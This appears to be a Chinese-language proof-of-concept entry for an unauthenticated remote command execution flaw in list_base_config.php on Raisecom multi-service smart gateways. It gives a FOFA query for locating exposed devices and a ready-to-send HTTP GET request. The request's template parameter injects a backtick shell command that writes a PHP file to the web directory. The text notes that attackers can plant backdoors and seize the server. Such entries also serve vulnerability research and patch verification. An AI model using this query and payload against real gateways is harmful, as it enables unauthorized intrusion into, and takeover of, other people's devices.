# 瑞斯康达-多业务智能网关-RCE

瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
body="/images/raisecom/back.gif" && title=="Web user login"
```

## poc

```javascript
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![效果图](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271140951.png)

![效果图](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271141489.png)